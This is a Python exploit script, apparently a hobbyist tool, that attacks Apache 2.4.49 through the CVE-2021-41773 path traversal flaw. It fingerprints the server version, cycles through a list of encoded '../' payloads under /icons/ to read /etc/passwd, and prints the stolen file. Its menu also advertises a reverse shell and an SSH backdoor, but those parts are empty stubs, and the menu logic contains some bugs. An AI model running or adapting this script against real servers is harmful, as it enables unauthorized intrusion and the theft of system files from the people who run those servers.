#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# =============================================================================
# Created By  : Cn
# Created Date: January 2022
# Description: Exploits Apache CVE-2021-41773 
# ======


import subprocess
import time
import requests
import sys
import urllib3

def initial_start():


	print("Velkommen til CN's apache exploiter")
	print("Bemærk, kræver at victims apache er version 2.4.49")
	print("-----")
	print("(1) Input specific URL")
	print("(2) Quit")

	while True:
		try:
			choice = int(input())
			break
		except:
			print("Not a valid choice")

	return choice


def step_1(url):
	print("Loading: " + url)
	time.sleep(1)
	print("Getting server information..")
	r = requests.get(url)
	time.sleep(1)
	server_type = r.headers["Server"]
	print(" ")
	if "2.4.49" in str(server_type):
		print("✅  Server is running a vulnerable version")
		print(server_type)
		step_2(url)
		time.sleep(1)
	else:
		print("❌  Server is NOT running a vulnerable version")	
	sys.exit(0)


def step_2(url):
	#"http://localhost:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
	#"http://localhost:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"

	access_path = 'icons/'
	#payloads = ['.%2e/%2e%2e/%2e%2e/%2e%2e', '.%2e/%2e%2e', '.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e', '.%2e%2e', '.%2E/%2E%2E/%2E%2E/%2E%2E','.%2e/%2e%2e/%2e%2e/%2e%2e','.%2E/.%2E/.%2E/.%2E/%2E/%2E','.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e']
	payloads = ['.%2e/.%2e/.%2e', '%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65', '.%2e/.%2e/.%2e/.%2e', '.%2e/%2e%2e/%2e%2e/%2e%2e', '.%2E/%2E%2E/%2E%2E/%2E%2E', '.%2e/%2e%2e/%2e%2e/%2e%2e','.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e']
	initial_file = '/etc/passwd'
	i = 0 
	for payload in payloads:
		try:
			#print("")
			exploit = str(url)+str(access_path)+str(payload)+str(initial_file)
			#print(exploit)
			print("Trying payload "+str(i+1)+" of "+str(len(payloads)))
			time.sleep(0.4)
			http = urllib3.PoolManager()
			response = http.request("GET", exploit)
			if "400 Bad Request" in str(response.data):
				print("❌ 400, Payload failed, trying new method..")
				i = i+1
				continue
			if "404 Not Found" in str(response.data):
				print("❌ 404, Payload failed, trying new method..")
				i = i+1
				continue				
			else:
				i = i+1
				time.sleep(1)
				print("")
				print("")
				print("... ✅ Succesfully injected payload variant "+str(i))
				#print(print(response.data))	
				i = i+1
				step_3(url,response.data)
				break
		except Exception as e:
			print("Error: "+str(e))	
		

def step_3(url,passwd):
	url = url
	time.sleep(1.5)
	print("")
	print("... ✅ Local file discovery succesful")
	print("")
	print("What now?")
	print("(1) Find passwd file")
	print("(2) Attempt to launch reverse shell for RCE exploit")
	print("(3) Quit")

	while True:
		try:
			choice = int(input())
			break
		except:
			print("Not a valid choice")

	if choice == 1:
		print("")
		print("Searching server passwd file, hold on...")
		time.sleep(3)
		if passwd != None:
			print("✅ Found passwd file!")
			time.sleep(0.6)
			print(passwd)
		else:
			print("❌ Could not find passwd file")
	if choice == 2:
		print("")
		print("Attempting to start RCE exploit..")
		step_5(url)

	if choice == 3:
		print("Listing users")

	if choice == 4:
		sys.exit(0)	

def step_5(url):
	print("rce")
	print("(1) Set up SSH backdoor")
	print("(2) Execute commands")		
	print("(3) Quit")

while True:
	choice = initial_start()

	if choice == 1:
		print("Input a valid URL")
		try:
			url = str(input())
			step_1(url)
		except Exception as E:
			print("Not a valid URL")
			print(E)
	if choice == 2:
		break





